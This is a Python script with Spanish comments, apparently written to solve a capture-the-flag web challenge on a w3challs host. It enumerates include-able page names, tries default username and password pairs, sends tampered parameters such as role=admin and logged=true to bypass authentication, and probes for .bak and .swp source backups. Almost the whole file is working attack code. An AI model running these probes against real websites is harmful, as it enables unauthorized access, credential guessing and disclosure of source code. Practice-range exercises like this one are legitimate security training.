#!/usr/bin/env python3
import requests
import re

s = requests.Session()
base = "https://vip.hax.w3challs.com/"

# El hint dice "file path restrictions" - esto significa que hay un include() con restricciones
# Necesito bypassear esas restricciones de forma inteligente

print("[*] SMART PATH RESTRICTION BYPASS...")

# Si hay restricciones, probablemente están filtrando:
# 1. "../" sequences
# 2. "php://" wrappers  
# 3. "/etc/" paths
# 4. Pero PERMITIENDO archivos locales

# Estrategia: usar el parámetro page para incluir archivos PHP locales sin path traversal

# Primero, verificar qué archivos existen localmente
local_files = [
    "home", "login", "contact", "member", "admin",  # Los que ya sabemos
    "config", "database", "db", "auth", "session",  # Comunes
    "flag", "secret", "key", "password",  # CTF files
    "include", "common", "functions", "init",  # Include files
    "users", "members", "authenticate",  # Auth related
    "panel", "dashboard", "control",  # Admin related
    "step2", "verify", "confirm", "validate",  # Two-step auth
    "2fa", "token", "otp", "code",  # 2FA related
]

for file in local_files:
    r = s.get(f"{base}index.php?page={file}")
    
    # Si el archivo existe, no mostrará el home page
    if 'Welcome to the VipWebArmy' not in r.text or len(r.text) < 1500:
        print(f"[!] FILE EXISTS: {file}")
        
        # Extraer contenido específico
        if '<form' in r.text and 'password' in r.text:
            print(f"    -> Has login form")
            # Extraer campos del form
            inputs = re.findall(r'<input[^>]*name="([^"]*)"', r.text)
            if inputs:
                print(f"    -> Form fields: {inputs}")
        
        # Buscar pistas
        if 'flag' in r.text.lower():
            print(f"    [!!!] FLAG MENTIONED!")
            flag_context = re.findall(r'.{0,50}flag.{0,50}', r.text.lower())
            for context in flag_context:
                print(f"    -> {context}")
        
        if 'password' in r.text.lower() and 'admin' not in file:
            print(f"    -> Contains 'password'")
        
        # Guardar páginas interesantes
        if file not in ["home", "login", "contact"]:
            with open(f"/workspace/page_{file}.html", "w") as f:
                f.write(r.text)

# Ahora, intentar el two-step authentication mencionado
print("\n[*] TWO-STEP AUTHENTICATION ANALYSIS...")

# La página de login dice "two-step authentication" y "make sure you have all needed information"
# Esto sugiere que después del login hay otro paso

# Intentar login y ver qué pasa
login_attempts = [
    ("admin", "admin"),
    ("LuG[3]R", "password"),
    ("test", "test"),
]

for user, pwd in login_attempts:
    s = requests.Session()  # Nueva sesión para cada intento
    
    # Login
    r1 = s.post(f"{base}index.php?page=login", data={'login': user, 'pass': pwd})
    
    # Verificar si hay redirección o nuevo contenido
    if 'step' in r1.text.lower() or 'verify' in r1.text.lower():
        print(f"[!] Second step detected for {user}")
    
    # Intentar acceder a páginas que podrían ser el segundo paso
    for page in ["verify", "step2", "authenticate", "confirm", "validate", "2fa", "token"]:
        r2 = s.get(f"{base}index.php?page={page}")
        if len(r2.text) < 1500 and 'Welcome' not in r2.text:
            print(f"[!] Page {page} accessible after login with {user}")
            
            # Si hay un form, extraerlo
            if '<form' in r2.text:
                print(f"    -> Has form")
                inputs = re.findall(r'<input[^>]*name="([^"]*)"', r2.text)
                if inputs:
                    print(f"    -> Fields: {inputs}")

# Intentar acceder directamente a member/admin con diferentes métodos
print("\n[*] DIRECT MEMBER ACCESS ATTEMPTS...")

# Tal vez member.php existe pero necesita ciertos parámetros
params_to_test = [
    {"id": "1"},
    {"user": "admin"},
    {"role": "admin"},
    {"auth": "1"},
    {"logged": "true"},
    {"session": "valid"},
    {"token": "admin"},
]

for params in params_to_test:
    r = s.get(f"{base}index.php?page=member", params=params)
    if 'flag' in r.text.lower() or len(r.text) > 2000:
        print(f"[!] Member access with params: {params}")

# Verificar si hay algún archivo .bak o backup
print("\n[*] CHECKING BACKUPS...")

backup_extensions = [".bak", ".old", ".save", ".swp", ".tmp", "~", ".backup", ".orig", ".copy"]
for file in ["index", "login", "member", "admin", "config"]:
    for ext in backup_extensions:
        r = s.get(f"{base}{file}.php{ext}")
        if r.status_code == 200 and 'Not Found' not in r.text:
            print(f"[!!!] BACKUP FOUND: {file}.php{ext}")
            if '<?php' in r.text:
                print(f"    -> Contains PHP code!")
                with open(f"/workspace/backup_{file}{ext}.txt", "w") as f:
                    f.write(r.text)